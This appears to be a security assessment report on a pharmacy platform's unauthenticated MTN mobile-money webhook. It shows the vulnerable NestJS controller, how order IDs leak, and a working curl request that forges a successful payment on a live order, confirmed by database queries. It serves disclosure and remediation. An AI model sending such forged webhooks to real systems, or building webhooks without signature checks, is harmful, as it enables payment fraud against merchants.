# MTN Webhook Payment Forgery — CRITICAL (Live-Confirmed)

## Vulnerability Summary

`POST /api/payments/webhook/mtn` is public (`@Public()`) and performs **no
signature / secret verification**. An attacker who knows an order UUID can
mark it as PAID — no real payment required — triggering order fulfillment
and stock release. The pharmacy loses both product and money.

**Status:** ✅ CONFIRMED ON LIVE — 2026-08-11
**Severity:** Critical (payment fraud)

---

## 1. Vulnerability Identification Process

### 1.1 Static review

`src/payments/payments.controller.ts:68-73`:

```typescript
@Public() // "Don't require a login for this specific URL"
@Post('webhook/mtn')
async handleMtnWebhook(@Body() data: MtnCallbackDto) {
  return this.paymentsService.processMtnPayment(data);
}
```

`src/payments/payments.service.ts:230-309` — `processMtnPayment()` only:

1. Looks up the order by `externalId` (order UUID)
2. Rejects if `receivedAmount < expectedAmount`
3. Rejects if `currency !== 'RWF'`
4. If `status === 'SUCCESSFUL'` → marks payment COMPLETED and calls
   `handlePaymentSuccess()`

There is **no HMAC**, **no webhook secret check**, and **no MTN API
server-to-server re-verification**. All four checks are attacker-controlled
(the attacker picks `amount`, `currency`, and `status`).

### 1.2 Why the order UUID is obtainable

- Seed orders use predictable numbers (`ORD-2026-0001..0006`)
- Any cashier/pharmacist can list orders: `GET /api/orders/pharmacy-orders`
- The super-admin compromise (previous pack) lists all order UUIDs
- Orders are UUIDv4, but only need to be *observed once* (e.g. via a
  public endpoint or the WS notification channel)

### 1.3 Dynamic confirmation

Chosen a live PENDING order (`ORD-20260619-C417`, MTN_MOMO, RWF 4,500):

```bash
curl -s -X POST $BASE/api/payments/webhook/mtn \
  -H 'Content-Type: application/json' \
  -d '{"externalId":"68f3c145-cccb-41dc-b5aa-b76d2ccbed7e",
       "amount":"4500","currency":"RWF","status":"SUCCESSFUL",
       "financialTransactionId":"POC-FORGED-TX-001"}'

# → {"status":"success","message":"Order marked as PAID"}   (HTTP 201)
```

DB verification immediately after:

```sql
SELECT "orderNumber", status, "paymentStatus" FROM orders WHERE id='68f3c145-…';
-- ORD-20260619-C417 | PENDING | COMPLETED        ← changed

SELECT status, "transactionId" FROM payments WHERE "orderId"='68f3c145-…';
-- COMPLETED | POC-FORGED-TX-001                  ← attacker-controlled tx id
```

*(State was restored to PENDING after the test.)*

---

## 2. Attack Chain

```
Attacker knows order UUID (seed / API / WS leak)
  → POST /api/payments/webhook/mtn (no auth)
  → payload: {externalId, amount>=total, currency:RWF, status:SUCCESSFUL}
  → order marked PAID → handlePaymentSuccess() → stock released / order ready
  → pharmacy fulfills order, attacker never pays
```

---

## 3. Evidence (2026-08-11)

```
Request:  POST /api/payments/webhook/mtn  (no Authorization header)
Response: {"status":"success","message":"Order marked as PAID"}
DB:       paymentStatus PENDING → COMPLETED, transactionId = POC-FORGED-TX-001
```

---

## 4. Files

| File | Purpose |
|---|---|
| `exploit.sh` | Forge webhook for any order UUID (parameterised) |
| `remediation.md` | Step-by-step remediation |
